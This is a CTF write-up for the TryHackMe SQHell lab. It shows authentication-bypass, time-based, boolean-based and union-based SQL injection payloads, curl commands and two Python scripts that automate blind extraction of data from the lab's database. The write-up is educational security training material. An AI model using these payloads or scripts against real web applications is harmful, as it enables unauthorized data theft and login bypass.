# SQHell

## Introduction:

Welcome to my another writeup! In this TryHackMe [SQHell](https://tryhackme.com/room/sqhell) room, you'll learn: time-based, boolean-based and union-based SQL injection, SQL inception, authentication bypass! Without further ado, let's dive in.

> Try and find all the flags in the SQL Injections

> Difficulty: Medium

```
Give the machine a minute to boot and then connect to [http://10.10.166.35](http://10.10.166.35/)

There are 5 flags to find but you have to defeat the different SQL injection types.

**Hint:** Unless displayed on the page the flags are stored in the flag table in the flag column.
```

- Overall difficulty for me: Hard

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SQHell]
└─# export RHOSTS=10.10.166.35   
                                                                                                 
┌──(root🌸siunam)-[~/ctf/thm/ctf/SQHell]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9b:64:85:9f:5d:fe:03:17:ce:0c:2c:f7:40:36:f8:5a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJqubhEQnh/K5r1UDMG/hwEy260J6btkHfs/PIFTIMp/BdPfNCo/ymq33em4Apy+JVCWdz8p3fxlNwscvdOdDLoFNNBU2mC0n4QC++bjy3zoUgJRjiiQfj3HDM7a/DKaOKTB5R4qfnCvc0+sKzviQhs9VBryjvFO3THwXFfGVRCIT7yA0xAJniSt4kUPyJ4nUVV7dbXsH9Gt3hGR3p5JIXBRmfPR5tN8PK1k3EByAwMb/Ia4vTkp3S4Xha8p89Ys1WewKZhK2yX+h8sG2PHVbdO+T9UnIsVZju3O4CabodElPrgTUsWQ4TD+w9qSG8BjJfxnyR3xUMKHQYtnvoR8As/EDgdEuXzFcPNUMaXE5cvyUo+e5x73taYH/peAsBBnCJyyQ+lA8CBkSD2zpCl0tP24aAVhwXhlW8Ibc7qkhDojPmxHOqGXoCgGDbP6jpXitbPD8EP84YxoNcZ8q1M3Mly+3C6P+rA1Hcn/o+PEF8Hdo+j+JKkOpnCpPKpR6gckU=
|   256 ee:e9:1d:f3:16:c0:d2:13:18:93:17:d2:55:21:e9:87 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCNFFaz44hB4+wfrpBoIlekGIbAxDXdUqobjId5S8SGWcJmp6+WMjI8RUPU4tMk85m+KX2ewdJ5vNGVcOpMTWL8=
|   256 f1:c2:74:86:0d:ca:82:d0:fc:0a:cd:e5:a1:31:74:b1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEWxhSrGLGLvDvfwzlJA4CFUeUw0xdJiGaxejdT1NppR
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Home
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 8.2p1 Ubuntu
80                | nginx 1.18.0 (Ubuntu)

## HTTP on Port 80

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a1.png)

### Flag 1 - Authentication Bypass

**In the home page, we can see that there is a login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a2.png)

Now, we can try to do authentication bypass via SQL injection. Simply type `' OR 1=1-- -` and type any password to bypass it.

**Now, this SQL statement will become:**
```sql
SELECT username, password FROM user_table WHERE username=''' OR 1=1-- - AND password=123;
```

**Let's break it down:**
- `'` means we're escaping the string
-  `OR 1=1` means we want the query returns `True`
-  `-- -` means we want to commented out the rest of the query

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a3.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a4.png)

We bypassed the login page!!

### Flag 2 - Time-Based SQL Injection

**In the Terms and Conditions page, we can see that the web server will log our IP address.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a20.png)

A common way to log a client IP is to adding a **HTTP header** to the web request, such as:
- X-Forwarded-For: 
- X-Originating-IP:
- X-Remote-IP:
- X-Remote-Addr:
- X-Forwarded-Host:

In this example, it may vulnerable to **time-based SQL injection**!

**I'll use a time-based SQL injection payload from [payloadbox](https://github.com/payloadbox/sql-injection-payload-list#generic-time-based-sql-injection-payloads)**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SQHell]
└─# curl -vv -H "X-Forwarded-For: 127.0.0.1' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL)-- -" http://$RHOSTS/terms-and-conditions
```

This payload indeed slept for 5 seconds!

Now, **we need to find the database name, table names and column names.** Also, according to [HackTricks about time-based SQL injection](https://book.hacktricks.xyz/pentesting-web/sql-injection#exploiting-time-based-sqli), we can use the following payload to extract table's data:

```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```

What this payload do is:

- If `A` is a valid character for the table name, it returns `True`
- If `A` is NOT a valid character for the table name, it returns `False`

**To do so, I'll:**

- Find the database name and table name:

After some guessing, I found that there is a database called `flag`, and table name called `flag`:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SQHell]
└─# curl -vv -H "X-Forwarded-For: 127.0.0.1' and (select sleep(5) from flag where SUBSTR(flag,1,1) = 'T')--
```

This payload indeed slept for 5 seconds, and the first character of the `flag` table is `T`.

**Since we know TryHackMe's flag format is: `THM{...}`, we can automate this process via a simple python script:**
```py
#!/usr/bin/env python3

import requests
import string
import time
import argparse

parser = argparse.ArgumentParser(description='A simple python script to automate time-based SQL injection for TryHackMe\'s SQHell room, Flag 2.')
parser.add_argument('-i', '--ip', help='The target IP or domain')
args = parser.parse_args()

url = f'http://{args.ip}/terms-and-conditions'
# From A-Z, 0-9, {}:
char = string.ascii_uppercase + string.digits + '{' + '}' + ':'
flag = ''
counter = 1

while True:
	for characters in char:
		header = {'X-Forwarded-For': f"'and (select sleep(3) from flag where SUBSTR(flag,{counter},1) = '{characters}')-- -"}

		start_time = int(time.time())
		requests.get(url, headers=header)
		end_time = int(time.time())

		if end_time - start_time >= 3:
			counter += 1
			flag += ''.join(characters)

			# Clean previous line
			print('\r', end='')
			print(f'Flag2 is: {flag}', end='')
			break

	if len(flag) >= 43:
		exit()
```

**Output:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SQHell]
└─# export RHOSTS=10.10.229.24
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/SQHell]
└─# python3 time-based-sqli.py -h
usage: time-based-sqli.py [-h] [-i IP]

A simple python script to automate time-based SQL injection for TryHackMe's SQHell room, Flag 2.

options:
  -h, --help      show this help message and exit
  -i IP, --ip IP  The target IP or domain
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/SQHell]
└─# python3 time-based-sqli.py -i $RHOSTS
[+] Flag2 is: THM{FLAG2:Redacted}
```

We found the flag!!

### Flag 3 - Boolean-Based SQL Injection

**In the `register` page, there is a javascript function that checking the username is available or not:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a21.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a22.png)

**View-Source:**
```html
<script>
    $('input[name="username"]').keyup(function(){
        $('.userstatus').html('');
        let username = $(this).val();
        $.getJSON('/register/user-check?username='+ username,function(resp){
            if( resp.available ){
                $('.userstatus').css('color','#80c13d');
                $('.userstatus').html('Username available');
            }else{
                $('.userstatus').css('color','#F00');
                $('.userstatus').html('Username already taken');
            }
        });
    });
</script>
```

Let's break down this javascript:

- Takes the `username` as input
- Get the `username` in JSON format from `/register/user-check?username={username}`
- If the response is available, shows `Username available`
- if the response is NOT available, shows `Username already taken`

Then, we can go to that page to see what is it:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SQHell]
└─# curl http://$RHOSTS/register/user-check?username=fake_user   
{"available":true} 

┌──(root🌸siunam)-[~/ctf/thm/ctf/SQHell]
└─# curl http://$RHOSTS/register/user-check?username=admin    
{"available":false}
```

Hmm... It seems like it's a **boolean-based SQL injection**.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a23.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a24.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a25.png)

What this payload does is:

- `admin` returns `True`
- `admin' AND 1=2` returns `True`, because `1=2` is always false
- `admin' AND 1=1` returns `False`, because `1=1` is always true

**Now, we can use the previous `substr` techique again. But, instead of sleeping for a certain seconds, we'll look for the `False` boolean value.**
```
admin' AND (substr((SELECT flag FROM flag LIMIT 0,1),1,1)) = 'T'-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a26.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a27.png)

**What this does is:**
- if the first character is matched to the data from table `flag`, returns `False`
- If the first character is NOT matched to the data from table `flag`, returns `True`

**Now, we can again write a simple python script to automate this process!**
```py
#!/usr/bin/env python3

import requests
import string
import argparse

parser = argparse.ArgumentParser(description='A simple python script to automate boolean-based SQL injection for TryHackMe\'s SQHell room, Flag 3.')
parser.add_argument('-i', '--ip', help='The target IP or domain')
args = parser.parse_args()

# From A-Z, 0-9, {}:
char = string.ascii_uppercase + string.digits + '{' + '}' + ':'
flag = ''
counter = 1

while True:
	for characters in char:
		url = f"http://{args.ip}/register/user-check?username=admin' AND (substr((SELECT flag FROM flag LIMIT 0,1),{counter},1)) = '{characters}'-- -"
		r = requests.get(url)

		# If the GET request content contains 'false', then do:
		if 'false' in r.text:
			counter += 1
			flag += ''.join(characters)
			
			# Clear previous line
			print('\r', end='')
			print(f'[+] Flag3 is: {flag}', end='')
			break

	if len(flag) >= 43:
		exit()
```

**Output:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SQHell]
└─# export RHOSTS=10.10.229.24
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/SQHell]
└─# python3 boolean-based-sqli.py -h                     
usage: boolean-based-sqli.py [-h] [-i IP]

A simple python script to automate boolean-based SQL injection for TryHackMe's SQHell room, Flag 3.

options:
  -h, --help      show this help message and exit
  -i IP, --ip IP  The target IP or domain
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/SQHell]
└─# python3 boolean-based-sqli.py -i $RHOSTS
[+] Flag3 is: THM{FLAG3:Redacted}
```

Nice! We found the flag!

### Flag 4 - SQL Inception

**In the home page, we can also see that there is an admin user:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a5.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a6.png)

**The GET parameter `id`, may vulnerable to SQL injection!!**

When we typed `id=0`, it shows that the SQL query can't fetch user id `0`, as this user id doesn't exist:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a7.png)

However, when I type `0 ' OR 1=1-- -`

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a8.png)

It returns user id `1` details! Which means it's vulnerable to SQL injection!!

Let's test for **`UNION` based SQL injection**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a9.png)

We can see that the `Posts` doesn't have value 3.

According to [pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) MySQL injection cheat sheet, we can enumerate the entire database.

**First, we can enumerate it's version:**
```sql
0 UNION ALL SELECT version(),NULL,NULL-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a10.png)

- MySQL version: `8.0.23-0ubuntu0.20.04.1`

**Next, we can find the current database name:**
```sql
0 UNION ALL SELECT concat(schema_name),NULL,NULL FROM information_schema.schemata-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a11.png)

In here, I found something weird, the output only shows database `information_schema`.

And I was stuck at here for a long time. Then I checked the hint:

> Well, dreams, they feel real while we're in them right?

This quote is refering a movie called `Inception` from 2010.

Next, based on this information, I searched for `SQL inception`, and this [blog](https://medium.com/bother7-blog/sql-database-inception-783a2b9a57a) comes up.

> SQL inception occurs when you the access the same database within itself in order to achieve the correct output.

**I also notice the `posts` is weird:**

```sql
0 UNION ALL SELECT 1,2,3 FROM information_schema.tables WHERE table_schema=database()-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a12.png)

```sql
0 UNION ALL SELECT 2,2,3 FROM information_schema.tables WHERE table_schema=database()-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a13.png)

**When the first payload ran, the `posts` section had 2 posts listed. However, the second payload didn't had any post.**

This is because the first payload has matched the user id `1`, and the second payload is user id `2`, which is not exist.

**Now, let's combine withthe idea of SQL inception:**
```sql
0 UNION ALL SELECT "1 UNION SELECT 1,flag,4,5 from flag-- -",2,3 FROM information_schema.tables WHERE table_schema=database()-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a14.png)

We found the flag!

### Flag 5 - Union-Based SQL Injection

**In the home page, the `Read More` page looks like is vulnerable to SQL injection!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a15.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a16.png)

Let's test for **Union-based SQL injection**!
```sql
0 UNION ALL SELECT 1,2,3,4-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a17.png)

It's vulnerable to **Union-based SQL injection**! Let's do enumeration!

**Enumerating current database name:**
```sql
0 UNION ALL SELECT NULL,database(),NULL,NULL-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a18.png)

- Database name: `sqhell_5`

> Note: Since we already know the database structure from Flag 2, I'll skip the enumeration process, like finding table name and column name.

**Flag 5:**
```sql
0 UNION ALL SELECT NULL,flag,NULL,NULL FROM flag-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/SQHell/images/a19.png)

That's it! We found the final flag!

# Conclusion

What we've learned:

1. Authentication Bypass via SQL Injection
2. Time-Based SQL Injection
3. Boolean-Based SQL Injection
4. SQL Inception
5. Union-Based SQL Injection